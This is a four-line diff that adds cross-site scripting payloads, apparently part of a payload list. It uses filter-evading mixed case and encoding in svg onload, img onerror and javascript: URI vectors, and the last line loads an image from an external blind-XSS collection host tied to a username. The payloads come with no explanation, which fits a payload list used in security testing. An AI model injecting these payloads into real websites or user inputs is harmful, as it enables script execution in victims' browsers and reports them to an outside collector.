@@ -1,0 +1,4 @@
+"><svg%20onLoAd=alErT%26%230000000040"1")> 
+jaVaScRiPt:{ alert`0` }
+<img src=1 onErrOr="javAsCrIpt:alert(3)"></img>
+'"><img src=https://xss.report/c/ryushe />
